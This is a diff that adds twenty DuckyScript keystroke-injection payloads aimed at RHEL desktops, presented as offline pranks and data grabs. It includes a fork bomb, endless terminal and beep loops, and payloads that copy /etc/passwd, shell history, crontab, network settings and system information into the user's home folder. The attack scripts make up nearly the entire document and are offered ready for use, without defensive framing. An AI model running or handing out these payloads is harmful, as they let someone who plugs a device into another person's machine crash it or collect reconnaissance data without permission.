@@ -83,3 +83,219 @@ ENTER
 DELAY 2000
 STRING exit
 ENTER
+
+
+20 Offline DuckyScript Payloads for RHEL Systems
+
+These are 20 varied offline payloads for RHEL, all working without internet/WiFi. They use terminal commands, file operations, and pranks.
+
+    Fork Bomb Basic
+
+REM Fork Bomb
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING :(){ :|:& };:
+ENTER
+STRING :
+ENTER
+
+Terminal Flood
+
+REM Terminal Flood
+DELAY 1000
+CTRL ALT t
+DELAY 500
+CTRL ALT t
+DELAY 500
+CTRL ALT t
+DELAY 500
+STRING echo "Flooded!"
+ENTER
+
+Grab /etc/passwd
+
+REM Grab passwd
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING cp /etc/passwd ~/Desktop/passwd.txt
+ENTER
+STRING exit
+ENTER
+
+Prank Message
+
+REM Prank
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING echo "Hacked!"
+ENTER
+DELAY 5000
+STRING exit
+ENTER
+
+Clear Screen Loop
+
+REM Clear Loop
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING while true; do clear; sleep 1; done
+ENTER
+
+Grab /etc/hosts
+
+REM Grab hosts
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING cp /etc/hosts ~/hosts.txt
+ENTER
+STRING exit
+ENTER
+
+Fake Alert
+
+REM Fake Alert
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING echo -e "\033[31mALERT: Virus Detected!\033[0m"
+ENTER
+
+List Processes
+
+REM List PS
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING ps aux > ~/processes.txt
+ENTER
+STRING exit
+ENTER
+
+Terminal Echo Loop
+
+REM Echo Loop
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING for i in {1..10}; do echo "Loop $i"; done
+ENTER
+
+Grab User History
+
+REM Grab History
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING cp ~/.bash_history ~/history.txt
+ENTER
+STRING exit
+ENTER
+
+Colorful Prank
+
+REM Color Prank
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING echo -e "\033[32mGreen Text!\033[0m"
+ENTER
+
+Disk Usage
+
+REM Disk Usage
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING df -h > ~/disk.txt
+ENTER
+STRING exit
+ENTER
+
+Infinite Beep
+
+REM Beep Loop
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING while true; do echo -e "\a"; sleep 1; done
+ENTER
+
+Grab Cron Jobs
+
+REM Grab Cron
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING crontab -l > ~/cron.txt
+ENTER
+STRING exit
+ENTER
+
+Fake Update
+
+REM Fake Update
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING echo "Updating system..."
+ENTER
+STRING sleep 10
+ENTER
+STRING echo "Done!"
+ENTER
+
+List Mounted
+
+REM List Mount
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING mount > ~/mounts.txt
+ENTER
+STRING exit
+ENTER
+
+Terminal Calculator
+
+REM Calc
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING echo $((2+2))
+ENTER
+
+Grab Network Config
+
+REM Grab Net
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING ifconfig > ~/net.txt
+ENTER
+STRING exit
+ENTER
+
+Random Text
+
+REM Random
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING echo "Random text here"
+ENTER
+
+System Info
+
+REM Sys Info
+DELAY 1000
+CTRL ALT t
+DELAY 2000
+STRING uname -a > ~/sysinfo.txt
+ENTER
+STRING exit
+ENTER
